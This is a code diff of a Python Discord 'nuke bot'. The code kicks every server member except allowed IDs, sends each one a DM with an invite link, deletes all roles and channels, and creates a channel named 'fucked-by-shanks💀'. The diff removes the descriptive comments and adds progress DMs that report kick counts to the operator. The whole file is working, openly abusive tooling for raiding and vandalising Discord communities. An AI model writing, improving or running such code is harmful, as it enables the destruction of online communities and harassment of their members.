@@ -1,7 +1,6 @@
 import os
 import discord
 import asyncio
-from typing import Optional
 
 async def kick_member(member: discord.Member, reason: str = "Server Nuked by Shanks"):
     try:
@@ -25,17 +24,7 @@ async def delete_channel(channel: discord.abc.GuildChannel):
         pass
 
 async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.User, invite_link: str = None):
-    """
-    Nuke a server with full process:
-    1. Use provided invite link (or create one)
-    2. Kick all members (except bot and allowed users) with 1/sec delay,
-       and send DM with invite link.
-    3. Delete all roles (except @everyone) with 0.5 sec delay.
-    4. Delete all channels, then create new text channel "fucked-by-shanks💀".
-    """
-    # Step 0: Use provided invite link or create one
     if not invite_link:
-        # Try to create an invite link
         text_channel = next((c for c in guild.channels if isinstance(c, discord.TextChannel)), None)
         if text_channel is None:
             try:
@@ -54,15 +43,14 @@ async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.U
     if not invite_link:
         invite_link = "No invite could be created."
 
-    # Step 1: Kick members
     allowed_ids = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip().isdigit()]
     members_to_kick = [
         m for m in guild.members
         if m.id not in allowed_ids and m.id != bot.user.id and m.id != user.id
     ]
 
-    # Send DM to each member and kick
-    for member in members_to_kick:
+    total = len(members_to_kick)
+    for idx, member in enumerate(members_to_kick, 1):
         try:
             dm = await member.create_dm()
             embed = discord.Embed(
@@ -78,20 +66,25 @@ async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.U
             pass
         
         await kick_member(member)
-        await asyncio.sleep(1)  # rate limit
+        
+        if idx % 10 == 0 or idx == total:
+            try:
+                dm = await user.create_dm()
+                await dm.send(f"⏳ Progress: {idx}/{total} members kicked...")
+            except:
+                pass
+        
+        await asyncio.sleep(1)
 
-    # Step 2: Delete roles
     roles = [r for r in guild.roles if r.name != "@everyone"]
     for role in roles:
         await delete_role(role)
         await asyncio.sleep(0.5)
 
-    # Step 3: Delete channels
     for channel in guild.channels:
         await delete_channel(channel)
         await asyncio.sleep(0.5)
 
-    # Step 4: Create new channel
     try:
         new_channel = await guild.create_text_channel("fucked-by-shanks💀")
         embed = discord.Embed(
@@ -106,7 +99,6 @@ async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.U
     except:
         pass
 
-    # Notify commander
     try:
         dm = await user.create_dm()
         embed = discord.Embed(
@@ -114,7 +106,7 @@ async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.U
             description=f"Successfully nuked **{guild.name}**!",
             color=discord.Color.green()
         )
-        embed.add_field(name="👥 Members Kicked", value=len(members_to_kick), inline=True)
+        embed.add_field(name="👥 Members Kicked", value=total, inline=True)
         embed.add_field(name="🔗 Invite Link", value=f"[Click to join]({invite_link})", inline=False)
         embed.set_footer(text="🔥 Shanks Nuke Bot")
         embed.timestamp = discord.utils.utcnow()
